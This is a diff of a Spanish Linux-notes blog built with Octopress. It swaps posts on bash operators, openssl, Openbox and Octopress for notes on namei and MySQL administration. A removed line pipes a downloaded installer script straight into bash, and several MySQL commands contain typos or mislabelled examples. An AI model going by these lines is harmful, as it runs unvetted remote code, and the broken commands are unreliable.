@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="[bash scripting] lógicos o de comparación de cadenas alfanuméricas: = (Verdadero si las 2 cadenas son iguales) != (Verdadero si las 2 cadenas son &hellip;">
+  <meta name="description" content="Mostrar la ruta desde el directorio raiz hasta donde especifiquemos. $ namei $(pwd) (hasta el presente directorio) $ namei -m $(pwd)/archivo ( &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,7 +80,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/operadores/">Operadores</a></h1>
+      <h1 class="entry-title"><a href="/blog/namei/">Namei</a></h1>
     
     
       <p class="meta">
@@ -96,1206 +96,991 @@
   
 
 
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>[bash scripting]</p>
+  <div class="entry-content"><p>Mostrar la ruta desde el directorio raiz hasta donde especifiquemos.</p>
 
-<p>lógicos o de comparación de cadenas alfanuméricas:</p>
+<blockquote><p>$ namei $(pwd) (hasta el presente directorio)</p>
 
-<pre><code>= (Verdadero si las 2 cadenas son iguales)
+<p>$ namei -m $(pwd)/archivo (mostrando permisos y propietarios)</p></blockquote>
+</div>
+  
+  
 
-!= (Verdadero si las 2 cadenas son distintas)
 
--n (Informa si la cadena tiene longitud mayor a cero)
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mysql/">Mysql</a></h1>
+    
+    
+      <p class="meta">
+        
 
--z (Informa si la cadena tiene longitud igual a cero)
 
-== (Verdadero si las 2 cadenas son iguales [solo en bash])
 
-&lt; (Si una cadena es menor que otra)
 
-&gt; (Si una cadena es mayor que otra)
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Gestor de bases de datos [BDs]. Las BDs se guardan en el directorio /var/lib/mysql/</p>
+
+<blockquote><p>$ mysqldump -u root -p proveedores > fichero.sql (Crear un backup de la BD &#8220;proveedores&#8221;.)</p>
+
+<p>$ mysql proveedores &lt; fichero.sql (Restaurar la BD &#8220;proveedores&#8221; de un archivo)</p>
+
+<p>$ mysqlimport -u root -p clientes fichero.sql (Otra forma de restaurar una BD si esta ya existe)</p>
+
+<p>$ mysqldump -u root -p &#8211;all-databases > fichero.sql (Backup de todas las BDs)</p>
+
+<p>$ mysqldump -u root -p clientes proveedores > fichero.sql (Backup de dos BDs)</p>
+
+<p>$ mysqldump -u root -p proveedores &#8211;ignore-table=antiguos > fichero.sql (Backup ignorando una tabla)</p>
+
+<p>$ mysqldump -u root -p base_de_datos tabla1 tabla2 > tabla1_y_tabla2.sql (Exportar solo unas tablas de una BDs)</p>
+
+<p>$ mysql -u root -p1234 (Acceder a la BD con el usuario &#8220;root&#8221; y contraseña &#8220;1234&#8221;[nótese que la contraseña está junto a la &#8220;p&#8221;)</p>
+
+<p>$ mysql -u root -p (Pedirá contraseña para acceder a la BD con el usuario &#8220;root&#8221;)</p>
+
+<p>$ mysql -u root -p datos (Entrar en mysql y directamente en la BD &#8220;datos&#8221; [notese que la BDs está separada de la &#8220;p&#8221; por un espacio, sinó se tomaría como la contraseña])</p></blockquote>
+
+<p>Una vez en el prompt de mysql [Todas las sentencias han de terminar con un punto y coma [;] menos la sentencia &#8220;USE&#8221;]:</p>
+
+<p>mysql> SHOW VARIABLES LIKE &#8216;datadir&#8217;; (muestra el directorio donde se almacenan las BDs)</p>
+
+<p>mysql> show databases; (Mostrar las BDs existentes)</p>
+
+<p>mysql> create database datos; (Crear la BD &#8220;datos&#8221;)</p>
+
+<p>mysql> DROP DATABASE datos; (Borrar toda una base de datos. El directorio /var/lib/mysql/datos/ tiene que estar vacio)</p>
+
+<p>mysql> USE datos (Entrar en la BD &#8220;datos&#8221;. Sin punto y coma final)</p>
+
+<p>mysql> show tables; (Mostrar las tablas de la BD en la que se ha entrado)</p>
+
+<p>mysql> DESCRIBE una_tabla (Mostrar los campos de una tabla concreta)</p>
+
+<p>mysql> exit (Salir de mysql. Tambien con &#8220;quid&#8221; o Ctrl+d)</p>
+
+<p>mysql> select version(), current_date; (Mostrar versión de mysql y fecha)</p>
+
+<p>Modelo de creación de una tabla dentro de una BD mysql:</p>
+
+<pre><code>mysql&gt; CREATE TABLE usuarios( 
+
+-&gt; nombre VARCHAR(20), apellido VARCHAR(20), 
+
+-&gt; profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE, 
+
+-&gt; antiguedad DATE); 
 </code></pre>
 
-<p>lógicos o de comparacion de valores numericos</p>
+<p>VARCHAR(20) (Que los valores que se almacenarán son de longitud variable de hasta 20 caracteres)</p>
 
-<pre><code>x -lt y (x menor que y)
+<p>CHAR(1) (Que el valor será fijo y solo tendrá un caracter)</p>
 
-x -le y (x menor o igual que y)
+<p>DATE (En formato YYYY-MM-DD)</p>
 
-x -eq y (x igual que y)
+<p>Para entrar datos en la tabla anterior, podemos crear un archivo de texto &#8220;usuarios.txt&#8221; que contenga un registro por línea con valores separados por tabuladores, cuidando que el orden de las columnas sea el mismo que utilizamos en la sentencia CREATE TABLE. Para valores que no conozcamos podemos usar valores nulos usando \N. Ejemplo:</p>
 
-x -ge y (x mayor o igual que y)
+<blockquote><p>$ nano usuarios.txt</p></blockquote>
 
-x -gt y (x mayor que y)
+<pre><code>Juan    Borras  contable    m   1964-05-12  1988-03-27 
 
-x -ne y (x no igual que y)
+Maria   Gil administrativo  f   1983-10-03  2004-08-05 
+
+Antonio Gomez   portero     m   \N      2006-11-01 
 </code></pre>
 
-<p>De comprobacion de atributos de fichero</p>
+<p>Nota.- El final del archivo no ha de contener ninguna linea en blanco. El archivo tiene que estar en /var/lib/mysql/datos (En el directorio de la misma base de datos donde se carga)</p>
 
-<pre><code>-d fichero (fichero existe y es un directorio)
+<p>Para cargarlo en la BD:</p>
 
--e fichero (fichero existe)
+<p>mysql> LOAD DATA INFILE &#8220;usuarios.txt&#8221; INTO TABLE datos;</p>
 
--f fichero (fichero existe y es regular [no un directorio])
+<pre><code>Nota.- En caso de que salga el error: The used command is not allowed with this MySQL version:
 
--r fichero (si fichero tiene permiso de lectura)
+# nano /etc/mysql/my.cnf
 
--s fichero (fichero existe y no esta vacio)
+Y en la sección [mysql] añadir la linea "local-infile": 
 
--w fichero (si fichero tiene permiso de escritura)
+    [mysql]
 
--x fichero (si fichero tiene permiso de ejecucion o de busqueda si es un directorio)
+    local-infile
 
--O fichero (si eres dueño del fichero)
-
--G fichero (si el grupo del fichero es igual al tuyo)
+Reinciar mysql. 
 </code></pre>
 
-<p>Algunos ejemplos:</p>
+<p>LOAD DATA (Permite especificar cuál es el separador de columnas y el separador de registros. Por defecto el tabulador es el separador de columnas (campos) y el salto de línea es el separador de registros)</p>
+
+<p>Para añadir un nuevo registro a la BD anterior:</p>
+
+<pre><code>mysql&gt; INSERT INTO usuarios 
+
+    -&gt; VALUES('Jose','Robles','administrativo','m',NULL,'2012-12-01'); 
+</code></pre>
+
+<p>Valores y fechas entre comillas simples y valores desconocidos NULL y no \N como entrando un archivo.</p>
+
+<p>mysql> SELECT * FROM usuarios; (Ver toda la tabla para comprobar si se ha añadido el último registro)</p>
+
+<p>Para modificar un registro puede realizarse borrando toda la tabla de datos y entrando nuevamente el archivo usuarios.txt si este está actualizado:</p>
+
+<p>mysql> DELETE FROM usuarios;</p>
+
+<p>mysql> LOAD DATA INFILE &#8220;usuarios.txt&#8221; INTO TABLE usuarios;</p>
+
+<p>O modificando solo el registro que corresponda:</p>
+
+<p>mysql> UPDATE usuarios SET nacimiento=&#8221;1959-04-12&#8221; WHERE apellido=&#8221;Gomez&#8221;; (Modificar campo &#8220;nacimiento&#8221; del apellido &#8220;Gomez&#8221;</p>
+
+<p>mysql> SELECT * FROM usuarios WHERE apellido=&#8221;Gomez&#8221;; (Verificar si se ha realizado la modificación)</p>
+
+<p>mysql> SELECT * FROM usuarios WHERE nacimiento >= &#8220;1990-1-1&#8221;; (filtrar los que han nacido antes de la fecha indicada)</p>
+
+<p>mysql> SELECT * FROM usuarios WHERE profesion=&#8221;administrativo&#8221; AND sexo=&#8221;f&#8221;; (filtrar los administrativos de sexo femenino)</p>
+
+<p>mysql> SELECT * FROM usuarios WHERE profesion=&#8221;portero&#8221; OR profesion=&#8221;contable&#8221;; (filtrar porteros y contables)</p>
+
+<pre><code>mysql&gt; SELECT * FROM usuarios WHERE (profesion="portero" AND sexo="f") 
+
+    -&gt; OR (nombre = "juan" AND sexo = "m"); (Filtrar distintas opciones encerradas entre parentesis) 
+</code></pre>
+
+<p>mysql> SELECT apellido, nacimiento FROM usuarios;</p>
+
+<p>mysql> SELECT antiguedad FROM usuarios; (Filtrar la columna &#8220;antiguedad&#8221;)</p>
+
+<p>mysql> SELECT nombre, nacimiento FROM usuarios ORDER BY nacimiento; (Ordenar por fecha nacimiento)</p>
+
+<p>mysql> SELECT * FROM la_tabla ORDER BY la_columna; (Ordenar por el número de una columna)</p>
+
+<p>mysql> DELETE FROM usuarios WHERE nombre=&#8217;Maria&#8217;; (Eliminar toda la entrada que contenga &#8220;Maria&#8221;)</p>
+
+<p>mysql> DROP TABLE usuarios; (Eliminar una tabla)</p>
+
+<p>mysql> DROP TABLE IS EXIST usuarios; (Eliminar tabla si existe)</p>
+
+<p>mysql> CHECK TABLE la_tabla EXTENDED; (Chequear la integridad de una tabla)</p>
+
+<p>mysql> REPAIR TABLE la_tabla; (Reparar una tabla)</p>
 
 <p>1.-</p>
 
-<p>Comprobar si un fichero tiene datos:</p>
+<p>En ciertos casos, para resolver el error: mysqldump: Got error: xxxx: Table &#8216;xxxxxxxxx&#8217; doesn&#8217;t exist when using LOCK TABLES:</p>
 
-<pre><code>#!/bin/bash 
-
-A=/etc/fstab
-
-if [ -s "$A" ] 
-
-then 
-
-    echo "Tiene datos" 
-
-else 
-
-    echo "No los tiene" 
-
-fi
-</code></pre>
+<blockquote><p>$ mysqldump -u root -p BDs &#8211;single-transaction > dump.sql</p></blockquote>
 
 <p>2.-</p>
 
-<p>Comprobar si un directorio es el personal del usuario:</p>
+<p>Otro sistema para importar una base de datos. Primero crearla, entrar en ella y ejecutar el source sobre el fichero sql:</p>
 
-<pre><code>#!/bin/bash 
+<pre><code>mysql&gt; CREATE DATABASE datos;
 
-read -p "Ingrese un directorio: " DIR 
+mysql&gt; USE datos;
 
-if [ $DIR = home ]
-
-then 
-
-    echo "Es tu directorio personal" 
-
-else 
-
-    echo "No es tu home" 
-
-fi 
-
-exit 0
+mysql&gt; SOURCE datos.sql;
 </code></pre>
 
 <p>3.-</p>
 
-<p>Verificar si un archivo pasado como argumento existe o no:</p>
+<p>Exportar una tabla a txt con determinado formato:</p>
 
-<pre><code>#!/bin/bash
+<pre><code>mysql&gt; SELECT * FROM tabla INTO OUTFILE "tabla.txt"
 
-if [ $# -eq 0 ]
+   --&gt; FIELDS TERMINATED BY '   '
 
-then
-
-     echo "Falta el parametro"
-
-     exit
-
-else
-
-    if [ -f $1 ]
-
-    then
-
-        echo "archivo existe"
-
-    else
-
-        echo "archivo no existe"
-
-    fi
-
-fi 
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/opera/">Opera</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Navegador</p>
-
-<p>1.-</p>
-
-<p>Para que google no detecte al navegador y poder usar g+</p>
-
-<p>En la barra de direcciones poner:</p>
-
-<pre><code>opera:config#ISP|Id
+   --&gt; LINES TERMINATED BY '\n\n\r';
 </code></pre>
 
-<p>Y en el espacio en blanco poner:</p>
+<p>FIELDS TERMINATED BY &#8217;  &#8217; (indica que los campos de cada línea terminarán con dos espacios.</p>
 
-<pre><code>AppleWebKit/535.1
-</code></pre>
+<p>LINES TERMINATED BY &#8216;\n\n\r &#8216;(indica el carácter como acaba cada linea, en este caso dos saltos de línea y retorno de carro</p>
 
-<p>Guardar y reiniciar.</p>
+<p>otras instrucciones de formato:</p>
 
-<p>2.-</p>
+<p>ENCLOSED BY &#8216;&#8221;&#8217; (Que los campos de tipo char, text, binary y enum de cada línea se entrecomillan)</p>
 
-<p>Suprimir el icono de la bandeja de entrada [tray]</p>
+<p>IGNORE 1 LINES (No cargar la primera línea del fichero de texto)</p>
 
-<p>Entrar en:</p>
-
-<p>about:config</p>
-
-<p>Escribir la palabra “tray” en el buscador y deseleccionar:</p>
-
-<p>Show Tray Icon.</p>
-
-<p>También cambiando la orden en el editor de menu:</p>
-
-<p>opera %u –notrayicon</p>
-
-<p>3.-</p>
-
-<p>Aceleración por hardware (Opera-next 12)</p>
-
-<p>about:config</p>
-
-<p>Apartado “User Prefs”</p>
-
-<p>Colocar los siguientes parámetros a “1”:</p>
-
-<p>Enable Hardware Acceleration</p>
-
-<p>Enable WebGL</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/openvt/">Openvt</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>lanza un programa en una nueva consola virtual [ttyX]. Ver deallocvt</p>
-
-<blockquote><p># openvt -c 9 ifconfig (Lanzar ifconfig en la /dev/tty9)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/openssl/">Openssl</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Codificador/descodificador</p>
-
-<blockquote><p>$ openssl aes-128-cbc -salt -in texto -out encriptado.aes128  (encriptar)</p>
-
-<p>$ openssl aes-256-cbc -d -salt -in encriptado.txt -out desencriptado.txt  (desencriptar)</p>
-
-<p>$ cat texto.txt | gzip | openssl des3 -salt -k clave > texto.txt.des3</p>
-
-<p>$ openssl list-cipher-commands  (listar todas las opciones de encriptado)</p>
-
-<p>$ hexdump -C ejemplo.aes128 (visualizar el resultado del encriptado)</p>
-
-<p>$ openssl enc -des3 -in archivo.tar.bz2 -out cifrado.tar.bz2.ssl  (cifrar paquetes)</p>
-
-<p>$ openssl enc -d -des3 -in cifrado.tar.bz2.ssl -out archivo.tar.bz2</p>
-
-<p>$ openssl rand -base64 6  (generar una contraseña)</p>
-
-<p>$ openssl enc -base64 -in imagen.jpg (Codificar una imagen)</p></blockquote>
-
-<p>Nota.- la opción &#8220;a&#8221; indica que codificará con base64. &#8220;-salt&#8221; Añade potencia al cifrado.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/openoffice/">Openoffice</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Suite ofimática</p>
-
-<blockquote><p>$ soffice &#8211;writer (&#8211;calc, &#8211;impress, &#8211;draw, &#8211;math, &#8211;base) Arrancar el programa</p>
-
-<p># spadmin  (Administración de impresoras)</p></blockquote>
-
-<p>Ajustes</p>
-
-<p>1.-</p>
-
-<p>Para que las presentaciones no se abran automaticamente:</p>
-
-<p>Descargar (ImpressRunner.oxt):</p>
-
-<p>Abrir Impress y en herramientas -> administrador de extensiones -> agregar</p>
-
-<p>Buscar el archivo descargado. Reiniciar la aplicación. Cuando inicie la presentación, clicar esc y cancelar.</p>
-
-<p>2.-</p>
-
-<p>Para previsualizar en miniaturas los documentos:</p>
-
-<blockquote><p># apt-get install ooo-thumbnailer</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/openbox/">Openbox</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Gestor de ventanas</p>
-
-<blockquote><p>$ openbox –-replace (Activa openbox)</p>
-
-<p>$ openbox &#8211;restart (Reinicia)</p>
-
-<p>$ openbox &#8211;reconfigure (Relee los archivos de configuración después de una modificación)</p></blockquote>
-
-<p>Los archivos de configuración se encuentran en el directorio: .config/openbox:</p>
-
-<ul>
-<li>autostart</li>
-</ul>
-
-
-<p>Donde se colocan las aplicaciones que arrancan cuando se inicia el sistema. La sintaxis es:</p>
-
-<pre><code>(sleep 1 &amp;&amp; nitrogen --restore) &amp; 
-
-(sleep 2 &amp;&amp; lxpanel) &amp; 
-
-(slepp 3 &amp;&amp; liferea) &amp; 
-
-(sleep 3 &amp;&amp; volumeicon) &amp; 
-
-(sleep 3 &amp;&amp; idesk) &amp; 
-</code></pre>
-
-<p>Retrasar [sleep] algunos segundos [1, 2, 3 ] el lanzamiento de las aplicaciones  y dejar los procesos en background [&amp;]</p>
-
-<ul>
-<li>rc.xml</li>
-</ul>
-
-
-<p>Archivo de configuración de los atajos de teclado y ratón. Cada atajo ha de colocarse en el interior de la etiqueta a la que correspondan: atajos de teclado entre <keyboard> y </keyboard>, los de ratón entre <mouse> y </mouse>&#8230;</p>
-
-<p>Ejemplo para abrir firefox pulsando la tecla Win + f:</p>
-
-<pre><code>&lt;keybind key="W-f"&gt;
-
-   &lt;action name="execute"&gt;
-
-   &lt;execute&gt;firefox&lt;/execute&gt;
-
-   &lt;/action&gt;
-
-&lt;/keybind&gt;
-</code></pre>
-
-<p>Ejemplo para mostrar el menú del botón derecho del ratón pulsando las teclas Ctrl + Alt + m:</p>
-
-<pre><code>&lt;keybind key="C-A-m"&gt;
-
-   &lt;action name="ShowMenu"&gt;
-
-   &lt;menu&gt;root-menu&lt;/menu&gt;
-
-   &lt;/action&gt;
-
-&lt;/keybind&gt;
-</code></pre>
-
-<ul>
-<li>menu.xml</li>
-</ul>
-
-
-<p>El menú que se muestra con el botón derecho del mouse.</p>
-
-<p>1.-</p>
-
-<p>Cuando no se montan automaticamente los dispositivos usb que se conectan:</p>
-
-<p>Añadir una o varias lineas a /etc/fstab con el siguiente contenido:</p>
-
-<p>/dev/sdc1 /media/pen1 auto  rw,users,noauto 0 0</p>
-
-<p>Modificando el nombre del dispositivo [ sdc2, sdc3&#8230;) en el gestor de archivos [thunar&#8230;] aparecera el icono y con doble clic se montará el dispositivo.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/oowrite/">Oowrite</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Procesador de textos de la suite ofimática openoffice.</p>
-
-<blockquote><p>$ oowriter -pt pdf archivo.doc</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/odt2txt/">Odt2txt</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Pasar archivos .odt a texto plano.</p>
-
-<blockquote><p>$ odt2txt archivo.odt –output=archivo.txt</p>
-
-<p>$ odt2txt archivo.odt | grep palabra (Buscar una palabra en un odt. Muestra el resultado en pantalla)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/od/">Od</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Vuelca ficheros en octal</p>
-
-<blockquote><p>$ od -x fichero</p>
-
-<p>$ cat texto.txt | od -x texto.octal</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/octopress/">Octopress</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-27T20:09:00+01:00" pubdate data-updated="true">27-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[git-core curl zlib1g-dev libssl-dev build-essential libreadline-dev libaml]</p>
-
-<p>CMS para gestión de contenido web que genera automaticamente los archivos html, css y javascript a partir de archivos de texto plano formateado en markdown (Ver) y sin utilizar base de datos.</p>
-
-<p>Pasos previos para su instalación en Debian y derivados:</p>
-
-<blockquote><p>$ curl -L https://get.rvm.io | bash -s stable –ruby</p>
-
-<p>$ source ~/.rvm/scripts/rvm</p>
-
-<p>$ rvm install 1.9.3</p>
-
-<p>$ rvm use 1.9.3</p>
-
-<p>$ rvm rubygems latest</p></blockquote>
-
-<p>En Arch (requiere el paquete curl):</p>
-
-<blockquote><p>$ curl -L get.rvm.io | bash -s stable</p>
-
-<p>$ source ~/.rvm/scripts/rvm</p>
-
-<p>$ rvm requirements</p>
-
-<p>$ rvm install 1.9.3</p>
-
-<p>$ rvm use 1.9.3 –default</p>
-
-<p>$ rvm rubygems current</p></blockquote>
-
-<p>Instalación de octopress:</p>
-
-<blockquote><p>$ git clone git://github.com/imathis/octopress.git octopress</p>
-
-<p>$ cd octopress</p>
-
-<p>$ gem install bundler</p>
-
-<p>$ bundle install</p>
-
-<p>$ rake install</p></blockquote>
-
-<p>Generar contenido (Ver markdown):</p>
-
-<blockquote><p>$ cd octopress</p>
-
-<p>$ rake new_post[“nombre_del_nuevo_post”]</p></blockquote>
-
-<p>Crea un archivo en la carpeta /home/usuario/octopress/source/_posts/ con el siguiente encabezado:</p>
-
-<pre><code>-- 
-
-layout: post 
-
-title: “Nombre_del_post” 
-
-date: 2012-10-17 19:27 
-
-comments: true 
-
-categories: 
-
--- 
-</code></pre>
-
-<p>Título del post [title], fecha [date], si permitimos o no comentarios [true/false] y catagorias [categories] entre corchetes y separadas por comas [comandos, redes]</p>
-
-<p>A continuación de este encabezado introducimos la entrada del post. Al finalizar la entrada para generar el archivo en la carpeta “public”:</p>
-
-<blockquote><p>$ rake generate</p></blockquote>
-
-<p>Para visualizarlo en local [http://localhost:4000] lanzar:</p>
-
-<blockquote><p>$ rake preview</p></blockquote>
-
-<p>Y no cerrar la terminal. Para matar la previsualización pulsar Ctrl +c</p>
-
-<p>La configuración del titulo del blog, subtítulo, autor, etc. Algunos parámetros a especificar:</p>
-
-<blockquote><p>$ nano _config.yml</p></blockquote>
-
-<pre><code>url: http://crontux.homelinux.com
-
-title: TRACTATUS ELEMENTALIS
-
-subtitle: Apuntes sobre Bash. GNU/Linux a tope.
-
-author: lapipaplena
-
-simple_search: http://google.com/search
-
-description: Orgasmos con Gnu/linux
-
-date_format: "%d-%m-%Y"
-
-search_text: "Buscar"
-
-paginate: 10 
-
-pagination_dir: blog 
-
-recent_posts: 10
-
-excerpt_link: "Leer m&amp;aacute;s &amp;rarr;"
-
-code_dir: downloads/scripts
-
-# Twitter
-
-twitter_user: templix
-
-twitter_tweet_count: 6
-
-twitter_show_replies: false
-
-twitter_follow_button: true
-
-twitter_show_follower_count: false
-
-twitter_tweet_button: true
-
-# Google Plus Profile
-
-# Hidden: No visible button, just add author information to search results
-
-googleplus_user: 107431970267257491799
-
-googleplus_hidden: false
-</code></pre>
-
-<p>Para la creación de nuevas páginas:</p>
-
-<blockquote><p>$ rake new_page[previa]</p></blockquote>
-
-<p>Si queremos que la nueva página salga en una pestaña &#8220;previa&#8221; en la cabecera:</p>
-
-<blockquote><p>$ nano source/_includes/custom/navigation.html</p></blockquote>
-
-<pre><code>&lt;li&gt;&lt;a href="/previa"&gt;Previa&lt;/a&gt;&lt;/li&gt;
-</code></pre>
-
-<p>En este archivo tambien se pueden personalizar los nombres de las pestañas. Si queremos una pestaña con un enlace a una web:</p>
-
-<blockquote><p>$ nano source/_includes/custom/navigation.html</p></blockquote>
-
-<pre><code>&lt;li&gt;&lt;a href="http://www.lapipaplena.net"&gt;Web&lt;/a&gt;&lt;/li&gt;
-</code></pre>
-
-<p>1.-</p>
-
-<p>Crear un apartado &#8220;Sobre mi&#8221; en el sidebar con una imagen web en el centro de la linea:</p>
-
-<blockquote><p>$ nano source/_includes/custom/asides/about.html</p></blockquote>
-
-<p>Con el siguiente contenido:</p>
-
-<pre><code>&lt;section&gt;
-
-  &lt;h1&gt;Sobre mi&lt;/h1&gt;
-
-  &lt;center&gt;
-
-  &lt;img src="https://lh5.googleusercontent.com/-WyGxndIWvo4/AAAAAAAAAAI/AAAAAAAACRI/L_iOIAgh69A/s250-c/photo.jpg" width="125" height="125"&gt;
-
-  &lt;/center&gt;
-
-  &lt;p&gt;Cualquier texto explicativo&lt;/p&gt;
-
-&lt;/section&gt;
-</code></pre>
-
-<p>Luego añadir el achivo en:</p>
-
-<blockquote><p>$ nano _config.yml</p></blockquote>
-
-<p>en la linea:</p>
-
-<pre><code>default_asides: [asides/num_entradas.html, asides/recent_posts.html, custom/asides/about.html]
-</code></pre>
-
-<p>2.-</p>
-
-<p>Para mostrar archivo con código [script.sh, por ejemplo] se ha de colocar en texto plano en la ruta especificada en _config.yml, linea code_dir [downloads/scripts/ en este caso] y si lo queremos en la barra de navegación:</p>
-
-<blockquote><p>$ nano source/_includes/custom/navigation.html</p></blockquote>
-
-<p>Y añadir la linea:</p>
-
-<pre><code>&lt;li&gt;&lt;a href="/scripts"&gt;Scripts&lt;/a&gt;&lt;/li&gt;
-</code></pre>
-
-<p>Si lo colocamos en un post, llamarlo con:</p>
-
-<pre><code>% include_code script.sh lang:bash script.sh %
-</code></pre>
-
-<p>Al principio de la linea antes del % colocar una llave abierta y al final despues del % la cerrada. Se han omitido porque Octopress lo interpreta.</p>
-
-<p>Nota.- Despues de cualquier modificación en las entradas o en los archivos de configuración lanzar:</p>
-
-<blockquote><p>$ rake generate</p></blockquote>
-
-<p>3.-</p>
-
-<p>Instalar un nuevo tema:</p>
-
-<blockquote><p>$ git clone git://github.com/tommy351/Octopress-Theme-Slash.git .themes/slash</p>
-
-<p>$ rake install[&#8216;slash&#8217;]</p>
-
-<p>$ rake generate</p></blockquote>
+<p>LINES STARTING BY &#8216;&#8212;&#8217; (Que todas las líneas empiezen con &#8220;&#8212;&#8221;.</p>
 
 <p>4.-</p>
 
-<p>Para que las busquedas se realicen en el mismo site y no en la web:</p>
+<p>Ejemplo parecido al anterior pero ordenando el fichero por el segundo campo:</p>
 
-<blockquote><p>$ nano _config.yml</p></blockquote>
+<pre><code>mysql&gt; SELECTC campo1,campo2,campo3 FROM tabla ORDER BY campo2 INTO OUTFILE "campos.txt"
 
-<p>Modificar la linea:</p>
+--&gt; FIELDS TERMINATED BY ' '
 
-<pre><code>simple_search: http://www.google.com/search?q=site%3Awww.lapipaplena.net&amp;q=
+--&gt; LINES TERMINATED BY '\n\r';
 </code></pre>
 
 <p>5.-</p>
 
-<p>Quitar la fecha del post en la url:</p>
+<p>Gestion de usuarios.</p>
 
-<blockquote><p>$ nano _config.yml</p></blockquote>
+<p>Cuando creamos un nuevo usuario en MySQL, éste queda identificado por su nombre de usuario más el nombre o IP del ordenador desde el cual hemos dicho que accederá (el carácter comodín &#8216;%&#8217; representa varios ordenadores).</p>
 
-<p>Y dejar la linea:</p>
+<p>Ejemplos:</p>
 
-<p>permalink: /blog/:title/</p>
+<pre><code> juan
 
-<p>Con lo que si se borran entradas antiguas para substituirlas por otras nueva con el mismo nombre, la indexación de google no se pierde.</p>
+ juan@'%'
+
+ juan@localhost
+
+ juan@'192.168.1.%'
+
+ juan@'%.dominio.org'
+</code></pre>
+
+<p>mysql> SELECT User,Host,Password FROM mysql.user; (Ver los usuarios)</p>
+
+<p>mysql> CREATE USER juan@&#8217;%&#8217; IDENTIFIED BY &#8216;1234&#8217;; (Crear un usuario con la contraseña 1234)</p>
+
+<p>mysql> CREATE USER john IDENTIFIED BY &#8216;1234&#8217;, peter IDENTIFIED BY &#8216;4321&#8217;; (Crear dos usuarios)</p>
+
+<p>mysql> RENAME USER john TO juan, peter TO pedro;</p>
+
+<p>mysql> DROP USER juan, pedro; (Borrar dos usuarios)</p>
+
+<p>mysql> SET PASSWORD FOR juan = PASSWORD(&#8216;abcde&#8217;) (Cambiar la contraseña de un usuario)</p>
+
+<p>mysql> SHOW GRANTS FOR pedro; (Ver los privilegios de un usuario)</p>
+
+<p>mysql> GRANT ALL ON <em>.</em> TO juan@localhost (Otorgar todos los privilegios a un usuario)</p>
+
+<p>mysql> REVOKE ALL ON <em>.</em> FROM juan@localhost; (Anular todos los privilegios de un usuario)</p>
 
 <p>6.-</p>
 
